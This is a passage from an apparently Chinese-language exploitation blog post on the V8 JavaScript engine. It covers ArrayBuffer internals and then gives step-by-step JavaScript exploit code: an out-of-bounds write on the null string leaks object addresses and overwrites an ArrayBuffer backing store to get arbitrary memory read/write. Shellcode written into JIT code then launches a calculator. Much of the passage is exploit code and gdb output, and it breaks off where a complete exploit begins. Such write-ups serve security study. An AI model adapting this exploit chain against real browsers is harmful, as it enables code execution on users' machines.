src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-141352.png" alt=""></li></ul></li></ul></li><li><p>实际演示</p><ul><li>存放function f()在数组中</li><li>用0xdeadbee查找这个数组的内存位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-142310.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-142325.png" alt=""></li><li><p>kCodeEntryOffset is a pointer to the JIT code (RWX area), many strategies to realize arbitrary code execution by writing shellcode before this</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-13-142516.png" alt=""></p></li></ul></li></ul><h3 id="JSArrayBuffer"><a href="#JSArrayBuffer" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h3><h4 id="ArrayBuffer-and-TypedArray"><a href="#ArrayBuffer-and-TypedArray" class="headerlink" title="ArrayBuffer and TypedArray"></a>ArrayBuffer and TypedArray</h4><ul><li>Originally ArrayBuffer<ul><li>一个可以直接从JavaScript访问内存的特殊数组<ul><li>但是，ArrayBuffer仅准备一个内存缓冲区</li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151055.png" alt=""></li><li>为了实际访问，有必要一起使用TypedArray或DataView<br>  <img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-151829.png" alt=""></li></ul></li><li>使用例子 (TypedArray版本)<ul><li>创建方法1，仅指定长度，初始化为零<br>t_arr = new Uint8Array(128) //ArrayBuffer被创建在内部</li><li>创建方法2，使用特定值初始化<br>t_arr = new Uint8Array([4,3,2,1,0]) //ArrayBuffer被创建在内部</li><li>创建方法3，事先构建缓冲区并使用它<br>arr_buf = new ArrayBuffer(8);<br>t_arr1 = new Uint16Array(arr_buf); //创建一个Uint16数组<br>t_arr2 = new Uint16Array(arr_buf, 0, 4); //或者，您也可以指定数组的开始和结束位置</li></ul></li><li>ArrayBuffer可以在不同的TypedArray之间共享<ul><li>它也可以用于double和int的类型转换<ul><li><strong>类型转换的意义在于改变字节序列的解释，而不是转换</strong></li><li>就像C语言的Union</li></ul></li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-153219.png" alt=""></li><li>①预先准备ArrayBuffer<br>var ab = new ArrayBuffer(0x100);</li><li>②向ArrayBuffer中写入一个Float64的值<br>var t64 = new Float64Array(ab);<br>t64[0] = 6.953328187651540e-310;//字节序列是0x00007fffdeadbeef<br><strong>–&gt;当某些地址在V8上泄露时，通常在大多数情况下被迫将其解释为双精度值，为了正确计算偏移量等，需要将其转换为整数值。 对于完成该转换，ArrayBuffer是最佳的</strong></li><li>③从ArrayBuffer读取两个Uint32<br>var t32 = new Uint32Array(ab);<br>k = [t32[1],t32[0]]<br><strong>–&gt;k是6.953328187651540e-310,将字节序列按照4个字节去分开，然后解释为Uint32,于是得到:</strong><br><strong>k=[0x00007fff，0xdeadbeef]</strong></li></ul></li></ul></li></ul><h4 id="JSArrayBuffer-1"><a href="#JSArrayBuffer-1" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h4><ul><li>持有ArrayBuffer的对象<ul><li>继承Object，HeapObject，JSReceiver，JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-155703.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放TypedArray</li><li>使用长度0x13370搜索ArrayBuffer的内存位置<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160126.png" alt=""></li><li>在V8中，对象通常被存放在由GC管理的mapped区域，然而BackingStore是一个不被GC管理的区域，并且被存放在heap中(在图中，可以看到malloc块有prev_size和size成员）<br>此外，由于它不是由GC管理的HeapObject，因此指向BackingStore的指针不是Tagged Value（末尾不能为1）<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-160917.png" alt=""></li><li>虽然在ArrayBuffer中描述了大小，但如果将此值重写为较大的值，则可以允许读取和写入的长度，超出BackingStore数组的范围。</li><li>同样，如果您可以重写BackingStore指针，则可以读取和写入任意内存地址，这些是在exploit中常用的方法。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-05-14-162614.png" alt=""><h3 id="工具类准备"><a href="#工具类准备" class="headerlink" title="工具类准备"></a>工具类准备</h3>主要是用于double和int值的转换<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// int-&gt;double</span></span><br><span class="line"><span class="comment">// d2u(intaddr/0x100000000,intaddr&amp;0xffffffff)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">d2u</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(<span class="number">2</span>);</span><br><span class="line">    d[<span class="number">0</span>] = num2;</span><br><span class="line">    d[<span class="number">1</span>] = num1;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(d.buffer);</span><br><span class="line">    <span class="keyword">return</span> f[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// double-&gt;int</span></span><br><span class="line"><span class="comment">// u2d(floataddr)</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u2d</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">    f = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(<span class="number">1</span>);</span><br><span class="line">    f[<span class="number">0</span>] = num;</span><br><span class="line">    d = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(f.buffer);</span><br><span class="line">    <span class="keyword">return</span> d[<span class="number">1</span>] * <span class="number">0x100000000</span> + d[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ul><h3 id="leak-ArrayBuffer和Function"><a href="#leak-ArrayBuffer和Function" class="headerlink" title="leak ArrayBuffer和Function"></a>leak ArrayBuffer和Function</h3><ol><li>触发漏洞，越界写null string的长度，写null string的value字段为obj</li><li>charCodeAt读出null string的value内容，从而leak出来<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ab = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x200</span>);</span><br><span class="line"><span class="keyword">var</span> n;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">n = <span class="keyword">new</span> <span class="built_in">Set</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    n.xyz = <span class="number">3.4766863919152113e-308</span>; <span class="comment">// do not modify string map</span></span><br><span class="line">    n.xyz1 = <span class="number">0x0</span>; <span class="comment">// do not modify the value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>; <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    n.xyz3 = obj; <span class="comment">// leak the Object </span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">Ctor(); <span class="comment">// 初始化n</span></span><br><span class="line">Check(ab); <span class="comment">//写入ArrayBuffer到value字段</span></span><br><span class="line"><span class="comment">// gdb-peda$ x/10gx 0x28767ae02240</span></span><br><span class="line"><span class="comment">// 0x28767ae02240:0x00000834750823090x0000000000000000</span></span><br><span class="line"><span class="comment">// 0x28767ae02250:0x00000834750823610x00000000803b1506</span></span><br><span class="line"><span class="comment">// 0x28767ae02260:0x00007000000000000x000004ea79906839-&gt;ArrayBuffer</span></span><br><span class="line"><span class="comment">// 0x28767ae02270:0x00000834750823610x00000000c5f6c42a</span></span><br><span class="line"><span class="comment">// 0x28767ae02280:0x00000006000000000xdead7463656a626f</span></span><br><span class="line"><span class="comment">// gdb-peda$ job 0x000004ea79906839</span></span><br><span class="line"><span class="comment">// 0x4ea79906839: [JSArrayBuffer]</span></span><br><span class="line"><span class="comment">//  - map = 0x3bcf5fc82db1 [FastProperties]</span></span><br><span class="line"><span class="comment">//  - prototype = 0xb3e9b805599</span></span><br><span class="line"><span class="comment">//  - elements = 0x28767ae02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_SMI_ELEMENTS]</span></span><br><span class="line"><span class="comment">//  - internal fields: 2</span></span><br><span class="line"><span class="comment">//  - backing_store = 0x55ba589d0640</span></span><br><span class="line"><span class="comment">//  - byte_length = 512</span></span><br><span class="line"><span class="comment">//  - properties = &#123;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//  - internal fields = &#123;</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="keyword">var</span> str = <span class="keyword">new</span> <span class="built_in">String</span>(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">var</span> ab_addr = str.charCodeAt(<span class="number">0</span>)*<span class="number">0x1</span>+str.charCodeAt(<span class="number">1</span>)*<span class="number">0x100</span>+str.charCodeAt(<span class="number">2</span>)*<span class="number">0x10000</span>+str.charCodeAt(<span class="number">3</span>)*<span class="number">0x1000000</span>+str.charCodeAt(<span class="number">4</span>)*<span class="number">0x100000000</span>+str.charCodeAt(<span class="number">5</span>)*<span class="number">0x10000000000</span>+str.charCodeAt(<span class="number">6</span>)*<span class="number">0x1000000000000</span>+str.charCodeAt(<span class="number">7</span>)*<span class="number">0x100000000000000</span>;</span><br><span class="line">print(<span class="string">"0x"</span>+ab_addr.toString(<span class="number">16</span>));</span><br></pre></td></tr></table></figure></li></ol><p>同理，leak出function</p><h3 id="写null-string的地址到它自己的value，从而可以通过写value来再次修改null-string"><a href="#写null-string的地址到它自己的value，从而可以通过写value来再次修改null-string" class="headerlink" title="写null string的地址到它自己的value，从而可以通过写value来再次修改null string"></a>写null string的地址到它自己的value，从而可以通过写value来再次修改null string</h3><p><strong>这里为什么要这么做呢，原因其实在test里已经可以看到的，如果我们写一个smi到一个属性字段，当然可以直接写到该属性字段对应的偏移。</strong><br>也就是如图xyz1，我直接写入了一个0x1821923f的smi，注意smi最大是多少呢，在64位和32位有所不同。<br>在64位平台上V8对smi定义的范围是[-2³¹，2³¹-1]，即最大0x7fffffff，显然一个对象的地址会大于它，从而无法直接去写一个地址到该属性字段对应的偏移。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/20gx $rax-1</span><br><span class="line">0x3067ec802240:0x000025b0e35823090x0000000000000000</span><br><span class="line">0x3067ec802250:0x000025b0e3582361-&gt;xyz0x1821923f-&gt;xyz1  803b1506</span><br><span class="line">0x3067ec802260:0x00007000-&gt;xyz2 000000000xdeadbeed6c6c756e</span><br></pre></td></tr></table></figure></p><p><strong>所以我们要写null string的地址到它自己的value，从而可以通过写value来再次修改null string。</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">Check(<span class="built_in">String</span>(<span class="literal">null</span>));</span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx $rbx-1</span></span><br><span class="line"><span class="comment">// 0x3817fa502240:0x00003bd6a43823090x0000000000000000</span></span><br><span class="line"><span class="comment">// 0x3817fa502250:0x00003bd6a43823610x00000000803b1506</span></span><br><span class="line"><span class="comment">// 0x3817fa502260:0x00007000000000000x00003817fa502251-&gt;null string</span></span><br><span class="line"><span class="comment">// gdb-peda$ job 0x00003bd6a4382361</span></span><br><span class="line"><span class="comment">// 0x3bd6a4382361: [Map]</span></span><br><span class="line"><span class="comment">//  - type: ONE_BYTE_INTERNALIZED_STRING_TYPE</span></span><br><span class="line"><span class="comment">//  - instance size: 0</span></span><br><span class="line"><span class="comment">//  - elements kind: FAST_HOLEY_ELEMENTS</span></span><br><span class="line"><span class="comment">//  - unused property fields: 0</span></span><br><span class="line"><span class="comment">//  - enum length: invalid</span></span><br><span class="line"><span class="comment">//  - stable_map</span></span><br><span class="line"><span class="comment">//  - back pointer: 0x3817fa502311 &lt;undefined&gt;</span></span><br><span class="line"><span class="comment">//  - instance descriptors (own) #0: 0x3817fa502231 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment">//  - layout descriptor: 0</span></span><br><span class="line"><span class="comment">//  - prototype: 0x3817fa502201 &lt;null&gt;</span></span><br><span class="line"><span class="comment">//  - constructor: 0x3817fa502201 &lt;null&gt;</span></span><br><span class="line"><span class="comment">//  - code cache: 0x3817fa502241 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment">//  - dependent code: 0x3817fa502241 &lt;FixedArray[0]&gt;</span></span><br><span class="line"><span class="comment">//  - construction counter: 0</span></span><br></pre></td></tr></table></figure><h3 id="修改null-string的hash字段为ArrayBuffer的length地址"><a href="#修改null-string的hash字段为ArrayBuffer的length地址" class="headerlink" title="修改null string的hash字段为ArrayBuffer的length地址"></a>修改null string的hash字段为ArrayBuffer的length地址</h3><p>这里我再次提醒一下为什么要写入这个地址。<br>之前我们说了，如果写一个smi，可以直接写入，但是如果要写入的数值大于smi，会把该属性字段的值当成一个指针，然后将这个数值写入到那个内存里。<br>就比如，我向null string的map字段（对应于n.xyz)写一个非SMI进去.<br>double类型的3.4766863919152113e-308等于int类型的0x0019000400007300<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line"><span class="comment">// oob write empty_Fixed_Array, write object to null_str buffer</span></span><br><span class="line">    n.xyz = <span class="number">3.4766863919152113e-308</span>; <span class="comment">// do not modify string map</span></span><br><span class="line">    n.xyz1 = <span class="number">0x0</span>; <span class="comment">// do not modify the value</span></span><br><span class="line">    n.xyz2 = <span class="number">0x7000</span>; <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">    n.xyz3 = obj; <span class="comment">// leak the Object addr</span></span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">gdb-peda$ x/<span class="number">20</span>gx <span class="number">0x33e606b02241</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x33e606b02240</span>:<span class="number">0x0000081f59a02309</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x33e606b02250</span>:<span class="number">0x0000081f59a02361</span>-&gt;n.xyz<span class="number">0x00000000803b1506</span></span><br><span class="line"><span class="number">0x33e606b02260</span>:<span class="number">0x0000700000000000</span><span class="number">0x000017f1e8c36fe96f</span></span><br><span class="line"></span><br><span class="line">gdb-peda$ x/<span class="number">20</span>gx <span class="number">0x0000081f59a02361</span><span class="number">-1</span></span><br><span class="line"><span class="number">0x81f59a02360</span>:<span class="number">0x0000081f59a02259</span><span class="number">0x0019000400007300</span>-&gt;被写入的<span class="number">3.4766863919152113e-308</span>即<span class="number">0x0019000400007300</span></span><br><span class="line"><span class="number">0x81f59a02370</span>:<span class="number">0x00000000082003ff</span><span class="number">0x000033e606b02201</span></span><br></pre></td></tr></table></figure></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> m;</span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">m = <span class="keyword">new</span> <span class="built_in">Map</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check2</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str buffer value will be treat as a number pointer</span></span><br><span class="line">m.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">m.xyz1 = <span class="number">0x0</span>                 <span class="comment">// do not modify the value</span></span><br><span class="line">m.xyz2 = <span class="number">0x7000</span> <span class="comment">// enlarge length of builtIn string 'null'</span></span><br><span class="line">m.xyz3 = addr</span><br><span class="line">&#125;</span><br><span class="line">Check2(ab_len_ptr_float);</span><br><span class="line"><span class="comment">// 0x3817fa502250:0x00003bd6a43823610x0000108ed87359d9-&gt;ArrayBuffer length的地址</span></span><br><span class="line"><span class="comment">// 0x3817fa502260:0x00007000000000000x00003817fa502251-&gt;null string</span></span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx 0x108ed87359c1-1</span></span><br><span class="line"><span class="comment">// 0x108ed87359c0:0x00002d714c002db10x000037191c982241</span></span><br><span class="line"><span class="comment">// 0x108ed87359d0:0x000037191c9822410x0000020000000000-&gt;length</span></span><br><span class="line"><span class="comment">// 0x108ed87359e0:0x000055ba589d0640-&gt;BackingStore</span></span><br></pre></td></tr></table></figure><p><strong>所以说为了写入一个地址到ArrayBuffer的BackingStore，首先将BackingStore向前减去8个字节的地址即length地址写入到hash字段。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-073443.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-073449.jpg" alt=""></p><h3 id="向null-string的hash字段写入任意值，得到任意地址读写的原语"><a href="#向null-string的hash字段写入任意值，得到任意地址读写的原语" class="headerlink" title="向null string的hash字段写入任意值，得到任意地址读写的原语"></a>向null string的hash字段写入任意值，得到任意地址读写的原语</h3><p>类似于我们上面写map一样，将[length_addr+0x8]即backingstore给覆盖成我们想要写入的内容。<br><strong>在v8里，只要你能修改backingstore的值，就可以进行任意地址读写</strong><br>于是就有了一个任意地址读写的原语。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-073824.png" alt=""></p><p><strong>于是我们先将func_addr写到backingstore，读到函数真正执行时候的code地址</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> l;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Ctor3</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">l = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check3</span>(<span class="params">addr</span>)</span>&#123;</span><br><span class="line"><span class="comment">// Oob write empty_Fixed_Array, str length will be treat as a number pointer </span></span><br><span class="line">l.xyz = <span class="number">3.4766863919152113e-308</span>;    <span class="comment">// do not modify string map</span></span><br><span class="line">l.xyz1 = addr             </span><br><span class="line">&#125;</span><br><span class="line">Ctor3();</span><br><span class="line">Check3(func_addr_float);</span><br><span class="line">f64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(ab);</span><br><span class="line">shellcode_addr_float = f64[<span class="number">7</span>];</span><br><span class="line">print(<span class="string">"0x"</span>+(u2d(shellcode_addr_float)).toString(<span class="number">16</span>));</span><br><span class="line"><span class="comment">// gdb-peda$ job 0x108ed87359c1</span></span><br><span class="line"><span class="comment">// 0x108ed87359c1: [JSArrayBuffer]</span></span><br><span class="line"><span class="comment">//  - map = 0x2d714c002db1 [FastProperties]</span></span><br><span class="line"><span class="comment">//  - prototype = 0x108ed8705599</span></span><br><span class="line"><span class="comment">//  - elements = 0x37191c982241 &lt;FixedArray[0]&gt; [FAST_HOLEY_SMI_ELEMENTS]</span></span><br><span class="line"><span class="comment">//  - internal fields: 2</span></span><br><span class="line"><span class="comment">//  - backing_store = 0x108ed8735a00-&gt;已经被改成了Function的地址</span></span><br><span class="line"><span class="comment">//  - byte_length = 512</span></span><br><span class="line"><span class="comment">//  - properties = &#123;</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">//  - internal fields = &#123;</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//     0</span></span><br><span class="line"><span class="comment">//  &#125;</span></span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx 0x108ed87359c1-1</span></span><br><span class="line"><span class="comment">// 0x108ed87359c0:0x00002d714c002db10x000037191c982241</span></span><br><span class="line"><span class="comment">// 0x108ed87359d0:0x000037191c9822410x0000020000000000</span></span><br><span class="line"><span class="comment">// 0x108ed87359e0:0x0000108ed8735a00-&gt;已经被改成了Function的地址0x0000000000000004</span></span><br><span class="line"><span class="comment">// 0x108ed87359f0:0x00000000000000000x0000000000000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// gdb-peda$ x/20gx 0x0000108ed8735a01-1</span></span><br><span class="line"><span class="comment">// 0x108ed8735a00:0x00002d714c0040f10x000037191c982241</span></span><br><span class="line"><span class="comment">// 0x108ed8735a10:0x000037191c9822410x000037191c982351</span></span><br><span class="line"><span class="comment">// 0x108ed8735a20:0x0000108ed872d8490x0000108ed8703951</span></span><br><span class="line"><span class="comment">// 0x108ed8735a30:0x000037191c984b210x000016396d105e00--&gt;shellcode_addr_float[7]</span></span><br><span class="line">...</span><br><span class="line"><span class="comment">// gdb-peda$ job 0x0000108ed8735a01</span></span><br><span class="line"><span class="comment">// 0x108ed8735a01: [Function]</span></span><br><span class="line"><span class="comment">//  - map = 0x2d714c0040f1 [FastProperties]</span></span><br><span class="line"><span class="comment">//  - prototype = 0x108ed87040b9</span></span><br><span class="line"><span class="comment">//  - elements = 0x37191c982241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span></span><br><span class="line"><span class="comment">//  - initial_map = </span></span><br><span class="line"><span class="comment">//  - shared_info = 0x108ed872d849 &lt;SharedFunctionInfo&gt;</span></span><br><span class="line"><span class="comment">//  - name = 0x37191c982471 &lt;String[0]: &gt;</span></span><br><span class="line"><span class="comment">//  - formal_parameter_count = 0</span></span><br><span class="line"><span class="comment">//  - context = 0x108ed8703951 &lt;FixedArray[235]&gt;</span></span><br><span class="line"><span class="comment">//  - literals = 0x37191c984b21 &lt;FixedArray[1]&gt;</span></span><br><span class="line"><span class="comment">//  - code = 0x16396d105da1 &lt;Code: FUNCTION&gt;</span></span><br></pre></td></tr></table></figure><p><strong>再将取得的函数真正执行时候执行的函数地址，写入到backingstore，从而通过它进行任意地址写，写入我们的shellcode</strong><br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Check3(shellcode_addr_float);</span><br><span class="line"><span class="comment">// pop /usr/bin/xcalc</span></span><br><span class="line"><span class="keyword">var</span> shellcode = <span class="keyword">new</span> <span class="built_in">Uint32Array</span>(ab);</span><br><span class="line">shellcode[<span class="number">0</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">1</span>] = <span class="number">0x90909090</span>;</span><br><span class="line">shellcode[<span class="number">2</span>] = <span class="number">0x782fb848</span>;</span><br><span class="line">shellcode[<span class="number">3</span>] = <span class="number">0x636c6163</span>;</span><br><span class="line">shellcode[<span class="number">4</span>] = <span class="number">0x48500000</span>;</span><br><span class="line">shellcode[<span class="number">5</span>] = <span class="number">0x73752fb8</span>;</span><br><span class="line">shellcode[<span class="number">6</span>] = <span class="number">0x69622f72</span>;</span><br><span class="line">shellcode[<span class="number">7</span>] = <span class="number">0x8948506e</span>;</span><br><span class="line">shellcode[<span class="number">8</span>] = <span class="number">0xc03148e7</span>;</span><br><span class="line">shellcode[<span class="number">9</span>] = <span class="number">0x89485750</span>;</span><br><span class="line">shellcode[<span class="number">10</span>] = <span class="number">0xd23148e6</span>;</span><br><span class="line">shellcode[<span class="number">11</span>] = <span class="number">0x3ac0c748</span>;</span><br><span class="line">shellcode[<span class="number">12</span>] = <span class="number">0x50000030</span>;</span><br><span class="line">shellcode[<span class="number">13</span>] = <span class="number">0x4944b848</span>;</span><br><span class="line">shellcode[<span class="number">14</span>] = <span class="number">0x414c5053</span>;</span><br><span class="line">shellcode[<span class="number">15</span>] = <span class="number">0x48503d59</span>;</span><br><span class="line">shellcode[<span class="number">16</span>] = <span class="number">0x3148e289</span>;</span><br><span class="line">shellcode[<span class="number">17</span>] = <span class="number">0x485250c0</span>;</span><br><span class="line">shellcode[<span class="number">18</span>] = <span class="number">0xc748e289</span>;</span><br><span class="line">shellcode[<span class="number">19</span>] = <span class="number">0x00003bc0</span>;</span><br><span class="line">shellcode[<span class="number">20</span>] = <span class="number">0x050f00</span>;</span><br></pre></td></tr></table></figure></p><p>然后再执行这个被我们改了内容的函数，就可以弹计算器了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil_f();</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-10-13-075203.png" alt=""></p><h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span 